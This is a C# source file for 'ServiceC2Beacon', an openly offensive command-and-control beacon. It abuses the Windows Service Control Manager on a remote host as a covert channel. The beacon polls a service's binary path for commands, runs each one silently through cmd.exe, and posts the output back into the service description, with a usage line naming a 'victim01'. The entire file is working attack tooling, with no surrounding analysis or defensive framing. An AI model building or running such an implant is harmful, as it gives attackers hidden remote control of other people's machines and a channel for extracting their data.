using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.ServiceProcess;

namespace ServiceC2Beacon
{
    internal class Program
    {
        //Handles for connecting to the remote database
        public static IntPtr schService = IntPtr.Zero;
        public static IntPtr schSCManager = IntPtr.Zero;

        [DllImport("advapi32.dll", EntryPoint = "OpenSCManagerW", ExactSpelling = true, CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManager(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern IntPtr OpenService(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", EntryPoint = "ChangeServiceConfig")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfigA(IntPtr hService, uint dwServiceType, int dwStartType, int dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, string lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool StartService(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool ChangeServiceConfig2(IntPtr hService, int dwInfoLevel, IntPtr lpInfo);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool CloseServiceHandle(IntPtr hService);

        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        public static extern bool QueryServiceConfigA(IntPtr hService, IntPtr lpServiceConfig, UInt32 cbBufSize, out UInt32 pcbBytesNeeded);

        [StructLayout(LayoutKind.Sequential)]
        internal struct SERVICE_DESCRIPTION
        {
            public string lpDescription;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct QUERY_SERVICE_CONFIG
        {
            public int serviceType;
            public int startType;
            public int errorControl;
            public IntPtr binaryPathName;
            public IntPtr loadOrderGroup;
            public int tagID;
            public IntPtr dependencies;
            public IntPtr startName;
            public IntPtr displayName;
        }

        [DllImport("kernel32.dll")]
        static extern uint GetLastError();

        public static int GetSleepTime(string host, string serviceName)
        {
            int sleepTime = 30;

            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("Lost handle... Trying to reestablish");
                ConnectToService(host, serviceName);
                if (schService == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
                    Environment.Exit(1);
                }
            }
            QUERY_SERVICE_CONFIG service_config = new QUERY_SERVICE_CONFIG();

            uint dwBytesNeeded = 0;
            QueryServiceConfigA(schService, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);
            bool result = QueryServiceConfigA(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
            if (result)
            {
                service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
                sleepTime = Int32.Parse(Marshal.PtrToStringAnsi(service_config.displayName));
                Console.WriteLine("Sleep: " + sleepTime);
            }
            Marshal.FreeHGlobal(ptr);

            return sleepTime;
        }

        public static void ClearCommand(string host, string serviceName)
        {
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("Lost handle... Trying to reestablish");
                ConnectToService(host, serviceName);
                if (schService == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
                    Environment.Exit(1);
                }
            }
            bool success = ChangeServiceConfigA(schService, 0xffffffff, 2, 0, "", null, null, null, null, null, null);
            if (!success)
            {
                Console.WriteLine("[-] Failed to clear command");
            }

        }

        public static string GetCommand(string host, string serviceName)
        {
            string cmd = "";

            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("Lost handle... Trying to reestablish");
                ConnectToService(host, serviceName);
                if (schService == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
                    Environment.Exit(1);
                }
            }

            QUERY_SERVICE_CONFIG service_config = new QUERY_SERVICE_CONFIG();
            uint dwBytesNeeded = 0;
            QueryServiceConfigA(schService, IntPtr.Zero, dwBytesNeeded, out dwBytesNeeded);
            IntPtr ptr = Marshal.AllocHGlobal((int)dwBytesNeeded);

            bool result = QueryServiceConfigA(schService, ptr, dwBytesNeeded, out dwBytesNeeded);
            if (result)
            {
                service_config = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(ptr, new QUERY_SERVICE_CONFIG().GetType());
                cmd = Marshal.PtrToStringAnsi(service_config.binaryPathName);
                Console.WriteLine("Command: " + cmd);
            }
            Marshal.FreeHGlobal(ptr);

            ClearCommand(host, serviceName);

            return cmd;
        }

        public static IntPtr ConnectToService(string host, string serviceName)
        {
            Console.WriteLine("[*] Connecting...");
            schSCManager = OpenSCManager(host, null, 0xF003F);
            if (schSCManager == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to get SCM handle");
                return IntPtr.Zero;

            }
            Console.WriteLine("[+] OpenSCManager handle retrived");


            schService = OpenService(schSCManager, serviceName, 0xF01FF);
            if (schService == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed to connect to service... LastError() " + GetLastError());
                return IntPtr.Zero;
            }
            Console.WriteLine("[+] Service handle retrived");
            Console.WriteLine("[+] Connection establieshed...");
            return schService;
        }
        public static void DisconnectFromService()
        {
            Console.WriteLine("Disconnecting from ServiceC2");
            if (schService != IntPtr.Zero)
            {
                CloseServiceHandle(schService);
            }
            if (schSCManager != IntPtr.Zero)
            {
                CloseServiceHandle(schSCManager);
            }
        }

        public static string RunCommand(string command)
        {

            string argument = "/C " + command;
            Process p = new Process();
            // Specifies not to use system shell to start the process
            p.StartInfo.UseShellExecute = false;
            // Instructs the process should not start in a separate window
            p.StartInfo.CreateNoWindow = true;
            // Indicates whether the output of the application is returned as an output stream
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.FileName = @"C:\Windows\System32\cmd.exe";
            p.StartInfo.Arguments = argument;
            p.Start();
            string res = p.StandardOutput.ReadToEnd();
            return res;
        }

        public static bool PostOutput(string host, string serviceName, string output)
        {
            if (schService == IntPtr.Zero)
            {   
                Console.WriteLine("Lost handle... Trying to reestablish");
                ConnectToService(host, serviceName);
                if (schService == IntPtr.Zero)
                {
                    Console.WriteLine("[-] Failed to reconnect... Shutting down");
                    Environment.Exit(1);
                }
            }

            SERVICE_DESCRIPTION service_descriptiona = new SERVICE_DESCRIPTION();

            service_descriptiona.lpDescription = output;
            IntPtr sdinfo = Marshal.AllocHGlobal(Marshal.SizeOf(service_descriptiona));
            if (sdinfo == IntPtr.Zero)
            {
                Console.WriteLine("[-] Failed marshalling");

            }

            Marshal.StructureToPtr(service_descriptiona, sdinfo, false); 
            bool success = ChangeServiceConfig2(schService, 1, sdinfo);

            if (!success)
            {
                Console.WriteLine("[-] Output update failed");
            }
            Console.WriteLine("[+] Output updated successfully");

            return success;
        }

        static void Main(string[] args)
        {

            bool active = true;
            if (args.Length != 2)
            {
                Console.WriteLine("ServiceC2Beacon.exe <hostname> <unique identifier>");
                Console.WriteLine("ServiceC2.Beacon.exe ws01 victim01");
                Environment.Exit(0);
            }
            //Catching Ctrl + C events to clean up correctly...
            Console.CancelKeyPress += delegate
            {
                DisconnectFromService();
            };
            string host = args[0];
            string serviceName = "Servicec2" + args[1];

            //Connecting to remote service
            ConnectToService(host, serviceName);

            //Setting up sleeptimer
            int sleeptime = GetSleepTime(host, serviceName);
            DateTime stopTime = DateTime.Now.AddSeconds(sleeptime);

            //C2 loop
            while (active)
            {
                DateTime startTime = DateTime.Now;
                if (startTime >= stopTime)
                {
                    string command = GetCommand(host, serviceName);
                    if (command.Equals("Exit", StringComparison.OrdinalIgnoreCase))
                    {
                        Console.WriteLine("[+] Shutting Down...");
                        DisconnectFromService();
                        Environment.Exit(0);
                    }

                    if (command.Length > 0)
                    {
                        string output = RunCommand(command);
                        PostOutput(host, serviceName, output);
                    }

                    stopTime = DateTime.Now.AddSeconds(GetSleepTime(host, serviceName));
                }
            }
            DisconnectFromService();
        }
    }
}
